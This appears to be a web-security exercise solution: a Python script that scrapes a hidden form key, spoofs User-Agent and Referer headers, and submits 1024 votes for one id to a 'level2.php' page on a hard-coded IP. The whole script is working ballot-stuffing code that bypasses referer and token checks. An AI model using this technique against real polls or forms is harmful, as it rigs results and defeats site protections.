#!/usr/bin/python3
from requests import get, post, Session
from bs4 import BeautifulSoup

def request_url(url):

    user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)\
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90\
Safari/537.36'
    my_referer = 'http://158.69.76.135/level2.php'
    header = {'User-Agent': user_agent,
                'Referer': my_referer}

    key = get(url, headers=header)
    soup = BeautifulSoup(key.text, 'html.parser')
    cookie = soup.find(attrs={"name": "key"}).get('value')
    param = {'id': '869',
            'holdthedoor': 'Submit',
            'key': cookie
            }

    example = post(url, data=param,cookies=key.cookies,
headers=header)
    if example.status_code == 200:
        print("ojo con eso manito")
    else:
        print(example.status_code)

    #print(soup.prettify())

for cont in range(1024):
    scraper1 = request_url('http://158.69.76.135/level2.php')
